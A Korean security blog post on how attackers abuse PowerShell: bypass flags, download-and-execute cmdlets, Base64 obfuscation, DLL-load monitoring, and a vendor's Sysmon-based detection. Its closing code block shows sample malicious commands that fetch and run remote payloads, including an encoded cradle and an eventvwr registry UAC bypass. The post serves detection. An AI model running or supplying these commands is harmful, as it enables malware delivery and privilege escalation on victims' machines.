---
date: 2020-05-12T00:03:00
draft: false
title: "PowerShell을 이용한 공격"
description: 
featured_image: "cdn/threats/powershell_attack_techniques-1.png"
tags: ["PowerShell", "악성코드", "웹 해킹", "보안 취약점", "PLURA"]
---

PowerShell은 시스템 관리 및 자동화를 목적으로 설계된 명령줄 셸 및 스크립팅 언어입니다.  
Windows Vista 이후 기본 탑재되었으며, 관리 도구로 유용한 만큼 공격자들에게도 자주 사용되고 있습니다.

<!--more-->
![powershell_attack_techniques](https://blog.plura.io/cdn/threats/powershell_attack_techniques-1.png)

---

### 1. 실행 정책 (Execution Policy)

Microsoft는 기본적으로 PowerShell 스크립트 실행을 제한합니다.  
그러나 공격자는 이를 쉽게 우회할 수 있습니다.  

**우회 플래그 예시:**  
- `-ExecutionPolicy` 또는 `-EP Bypass`  
- `-ExecutionPolicy` 또는 `-EP Unrestricted`  
- `-noprofile` 또는 `-nop`  

*Profile Bypass: 각 세션이 시작될 때 PowerShell을 구성하기 위해 설정된 Profile도 무시할 수 있습니다.*

---

### 2. 다운로드

PowerShell 클래스 및 메소드를 사용하여 악성 파일을 다운로드 및 실행할 수 있습니다.  

자주 사용되는 명령어:  
- **New-Object**: .NET Framework의 인스턴스를 생성합니다.  
- **System.Net.WebClient**: 원격 리소스와 데이터 송수신에 사용됩니다.  
- **DownloadString**: 원격지에서 내용을 메모리 버퍼로 다운로드합니다.  
- **DownloadFile**: 원격지에서 로컬 파일로 콘텐츠를 다운로드합니다.  
- **IEX (Invoke-Expression)**: 명령을 실행합니다.  
- **ICM (Invoke-Command)**: 로컬 및 원격 컴퓨터에서 명령을 실행합니다.

---

### 3. 인코딩

- PowerShell 명령어를 숨기기 위해 Base64 인코딩이 자주 사용됩니다.  
- 인코딩된 명령어는 명령줄 길이가 비정상적으로 길어질 수 있습니다.  
- 500자 이상의 긴 명령어는 의심해볼 필요가 있습니다.

---

### 4. DLL 호출

- 의심스러운 DLL 호출 조합을 찾아야 악의적 행동을 탐지할 수 있습니다.  
- PowerShell.exe 또는 PowerShell_ISE.exe 이외의 실행 파일에서 아래 DLL 호출이 발생하는지 모니터링하세요.  
  - `System.Management.Automation.Dll`  
  - `System.Management.Automation.ni.Dll`  
  - `System.Reflection.Dll`  

*Sysmon ID 7 (ImageLoaded)을 활용해 확인할 수 있습니다.*

---

### 5. PLURA에서 PowerShell 악성 행위 탐지

**Sysmon 설치 필수**  
- [설치 가이드 보기](https://docs.plura.io/ko/agents/edr/windows/sysmon)

![PLURA 탐지](https://github.com/user-attachments/assets/7f971a25-61de-4a51-8e71-c4e861881576)

---

#### 악성 파일 실행 탐지 예시

PowerShell 우회 및 공격자 서버에서 파일 다운로드 행위 발생:  

![PowerShell 악성 실행](https://github.com/user-attachments/assets/11765e61-7cd0-4b98-8fce-026429934f1c)

**PLURA 필터 탐지**  
PLURA는 Sysmon을 활용하여 아래와 같은 악성 명령을 탐지합니다:

```bash
powershell.exe -nop -NoProfile -WindowStyle 1 -c IEX (New-Object Net.WebClient).DownloadString('https://blog.plura.io/demo/testfile.exe')

cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShHV21pIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbjskV0M9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRXQy5IZWFkZXJzWydVc2VyLUFnZW50J109IlBvd2VyU2hlbGwvV0wgJE9TIjtJRVggJFdDLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmxvZy5wbHVyYS5pby9kZW1vL3Rlc3RmaWxlLnBocCcpOw==

cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
```

## 📖 함께 읽기

- [SANS 자료](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1511980157.pdf)  
- [Broadcom 보고서](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)  
- [AhnLab 기사](https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=25651)  

